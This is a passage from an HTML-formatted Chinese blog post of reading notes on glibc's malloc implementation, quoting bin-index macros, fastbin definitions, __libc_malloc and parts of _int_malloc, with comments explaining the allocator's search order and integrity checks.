class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-comment">//sz&lt;0x3f0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-comment">//很多保证兼容性的操作</span><br><span class="hljs-comment">//small bin从2到63共62个</span><br><span class="hljs-comment">//64位：每个small bin的大小都是2*SIZE_SZ*idx（bins数组下标）</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br><span class="hljs-comment">//还是保证兼容性的操作，SIZE_SZ==8（64位）执行largebin_index_64版本的寻址宏</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    数量            bin中chunk之间的公差</span><br><span class="hljs-comment">    64 bins of size       8 small bin</span><br><span class="hljs-comment">    32 bins of size      64</span><br><span class="hljs-comment">    16 bins of size     512</span><br><span class="hljs-comment">     8 bins of size    4096</span><br><span class="hljs-comment">     4 bins of size   32768</span><br><span class="hljs-comment">     2 bins of size  262144 large bin</span><br><span class="hljs-comment">     1 bin  of size what&#x27;s left</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">第1个large bin链中的chunk大小为[1024,1024+64)</span><br><span class="hljs-comment">第2个large bin链中的chunk大小为[1024+64,1024+128)</span><br><span class="hljs-comment">……</span><br><span class="hljs-comment">第33个large bin链中的chunk大小为[xxxx,xxxx+512)</span><br><span class="hljs-comment">以此类推</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_index(sz) \</span><br><span class="hljs-meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br></code></pre></td></tr></table></figure><h3 id="unsorted-bin、top-chunk和binmap"><a href="#unsorted-bin、top-chunk和binmap" class="headerlink" title="unsorted bin、top chunk和binmap"></a>unsorted bin、top chunk和binmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unsorted chunks</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br><br><span class="hljs-comment">//top</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br><br><span class="hljs-comment">//binmap</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-comment">//128个bin，一个bin用1bit表示，每个binmap元素存32bit</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-comment">//32，&lt;&lt;的参数是右边那个(ˉ▽ˉ；)...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span><br><span class="hljs-comment">//binmap数组大小</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></td></tr></table></figure><h3 id="fastbin相关宏定义"><a href="#fastbin相关宏定义" class="headerlink" title="fastbin相关宏定义"></a>fastbin相关宏定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-comment">//当合并chunk&gt;FASTBIN_CONSOLIDATION_THRESHOLD时</span><br><span class="hljs-comment">//触发malloc_consolidate()函数合并fastbin中的chunk</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br></code></pre></td></tr></table></figure><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc源码"><a href="#libc-malloc源码" class="headerlink" title="__libc_malloc源码"></a>__libc_malloc源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-comment">//读取__malloc_hook钩子函数，如果有则运行钩子函数并返回</span><br><br>  arena_get (ar_ptr, bytes);<br><span class="hljs-comment">//寻找一个arena分配内存</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br><span class="hljs-comment">//调用_int_malloc()分配内存</span><br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br><span class="hljs-comment">//不成功就继续尝试寻找arena</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><span class="hljs-comment">//申请anera还需要解锁</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br><span class="hljs-comment">//检查  </span><br><span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-malloc源码及解析"><a href="#int-malloc源码及解析" class="headerlink" title="_int_malloc源码及解析"></a>_int_malloc源码及解析</h3><p>_int_malloc中堆块的搜索顺序：</p><ol><li>fastbin中寻找完全一样的</li><li>small bin中寻找完全一样的</li><li>如果2不满足且victim&#x3D;&#x3D;null，调用malloc_consolidate并初始化堆</li><li>计算large bin的index，调用consolidate整理fastbin</li><li>遍历unsorted bin并整理，寻找完全一样的，如果请求的chunk属于small bin、是remainder、可拆分且是unsorted bin中唯一的chunk，拆分并返回。在遍历过程中如果遇到大小完全一样的直接返回</li><li>在large bin中找，比需求大的最小的一个，如果可分割就分割后返回，remainder插入unsorted bin，否则直接返回</li><li>binmap搜索bins</li><li>切割top chunk</li></ol><h4 id="大小转化和arena检查"><a href="#大小转化和arena检查" class="headerlink" title="大小转化和arena检查"></a>大小转化和arena检查</h4><p>（1）请求的bytes转化为chunk的大小nb，如果没有arena就调用sysmalloc()，用mmap()分配chunk返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">    mmap.  */<br> <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>   &#123;<br>     <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>     <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes);<br>     <span class="hljs-keyword">return</span> p;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="fastbin扫描"><a href="#fastbin扫描" class="headerlink" title="fastbin扫描"></a>fastbin扫描</h4><p>（2）在fastbin中寻找大小完全一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>   &#123;<br><span class="hljs-comment">//根据nb找到fastbin相应的元素</span><br>     idx = fastbin_index (nb);<br>     mfastbinptr *fb = &amp;fastbin (av, idx);<br>     mchunkptr pp = *fb;<br><span class="hljs-comment">//如果fastbin中有chunk按LIFO规则取出</span><br>     <span class="hljs-keyword">do</span><br>       &#123;<br>         victim = pp;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>           <span class="hljs-keyword">break</span>;<br>       &#125;<br>     <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>            != victim);<br><span class="hljs-comment">//如果victim！=null，检查后返回给用户</span><br>     <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>       &#123;<br>         <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>           &#123;<br><span class="hljs-comment">//chunksize和相应fastbin链的大小相符检测</span><br>             errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>           errout:<br>             malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>           &#125;<br>         check_remalloced_chunk (av, victim, nb);<br>         <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="small-bin扫描"><a href="#small-bin扫描" class="headerlink" title="small bin扫描"></a>small bin扫描</h4><p>（3）在small bin中找大小完全一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>   &#123;<br><span class="hljs-comment">//根据nb找small bins中相应的bin</span><br>     idx = smallbin_index (nb);<br>     bin = bin_at (av, idx);<br><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br><span class="hljs-comment">//如果bin链不为空</span><br><span class="hljs-comment">//取bin链中的最后一个chunk</span><br>       &#123;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>           malloc_consolidate (av);<br><span class="hljs-comment">//如果victim==null调用malloc_consolidate并初始化堆</span><br>         <span class="hljs-keyword">else</span><span class="hljs-comment">//有符合要求的chunk</span><br>           &#123;<br>             bck = victim-&gt;bk;<br><span class="hljs-comment">//检查victim-&gt;bk的fd是否指向victim</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br><span class="hljs-comment">//victim的nextchunk的inuse位置1</span><br>             set_inuse_bit_at_offset (victim, nb);<br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><span class="hljs-comment">//从bin链中摘下victim</span><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>               victim-&gt;size |= NON_MAIN_ARENA;<br><span class="hljs-comment">//返回给用户</span><br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="largebin的index计算并整理fastbin"><a href="#largebin的index计算并整理fastbin" class="headerlink" title="largebin的index计算并整理fastbin"></a>largebin的index计算并整理fastbin</h4><p>（4）如果nb不属于small bin，计算large bin的index并调用malloc_consolidate整理fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>   &#123;<br>     idx = largebin_index (nb);<br>     <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>       malloc_consolidate (av);<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="遍历unsorted-bin并整理"><a href="#遍历unsorted-bin并整理" class="headerlink" title="遍历unsorted bin并整理"></a>遍历unsorted bin并整理</h4><p>（5）进入一个大的for(;;)循环，循环以下所有步骤。第一步先从最后一个chunk开始遍历unsorted bin并整理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(;;)<br>&#123;<br><span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br><span class="hljs-comment">//检查chunk的大小是否符合unsorted bin</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>……<br><br><br><span class="hljs-comment">//从unsorted bin中摘下最后一个遍历过的chunk</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br><br>……<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>&#125;<br><br>……<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-bin中先遇last-remainder"><a href="#unsorted-bin中先遇last-remainder" class="headerlink" title="unsorted bin中先遇last_remainder"></a>unsorted bin中先遇last_remainder</h4><p>（6）如果nb属于small bin（可能上次small bin中查询时是空的）、unsorted bin只有这一个chunk、victim是last_remainder（上次切分chunk剩下的）且可以拆分的话拆分这个chunk并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>            bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>          &#123;<br>            <span class="hljs-comment">/* split and reattach remainder */</span><br><span class="hljs-comment">//更新remainder chunk信息</span><br>            remainder_size = size - nb;<br>            remainder = chunk_at_offset (victim, nb);<br><span class="hljs-comment">//新remainder连入unsorted bin</span><br>            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>            av-&gt;last_remainder = remainder;<br>            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//如果remainder处于large bin则清空fd_nextsize和bk_nextsize</span><br>            <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>              &#123;<br>                remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>              &#125;<br><span class="hljs-comment">//还是更新remainder chunk信息</span><br>            set_head (victim, nb | PREV_INUSE |<br>                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            set_head (remainder, remainder_size | PREV_INUSE);<br>            set_foot (remainder, remainder_size);<br><br><span class="hljs-comment">//返回给用户</span><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-bin中后找到合适chunk"><a href="#unsorted-bin中后找到合适chunk" class="headerlink" title="unsorted bin中后找到合适chunk"></a>unsorted bin中后找到合适chunk</h4><p>（7）如果大小和nb一样直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)<br>  &#123;<br>    set_inuse_bit_at_offset (victim, size);<br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      victim-&gt;size |= NON_MAIN_ARENA;<br>    check_malloced_chunk (av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="整理在遍历unsorted-bin中摘下来的chunk"><a href="#整理在遍历unsorted-bin中摘下来的chunk" class="headerlink" title="整理在遍历unsorted bin中摘下来的chunk"></a>整理在遍历unsorted bin中摘下来的chunk</h4><p>（8）整理分类摘下来的victim<br>large bin说明：</p><ul><li>large bin可以看作由fd_nextsize和bk_nextsize连起来的一个个小链表，小链表用fd和bk连接，一个小链表内的chunk大小相同</li><li>把large bin数组的元素当作第一个小链表，只有一个chunk，其fd和bk视为fd_nextsize和bk_nextsize，连接链表中最大的chunk链表和最小的chunk链表</li><li>小链表按从大到小排列，bin元素的fd指向最大的chunk链表，bk指向最小的chunk链表</li><li>bin链表的最大chunk链和最小chunk链通过nextsize相连  </li><li>小chunk链的前后端连向两边的两个chunk链头<img src="/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/large_bin.jpg" class title="large bin链表结构（图源见水印）"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//bck表示victim的前一个chunk，fwd表示victim的后一个chunk</span><br><span class="hljs-comment">//如果符合small bin</span><br>         <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>           &#123;<br>             victim_index = smallbin_index (size);<br>             bck = bin_at (av, victim_index);<br>             fwd = bck-&gt;fd;<br>           &#125;<br><span class="hljs-comment">//否则放进large bin</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             victim_index = largebin_index (size);<br>             bck = bin_at (av, victim_index);<span class="hljs-comment">//第一个小链表</span><br>             fwd = bck-&gt;fd;<span class="hljs-comment">//第二个小链表</span><br><br>             <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>             <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//链表不空</span><br>               &#123;<br>                 <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                 size |= PREV_INUSE;<br>                 <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                 assert ((bck-&gt;bk-&gt;size 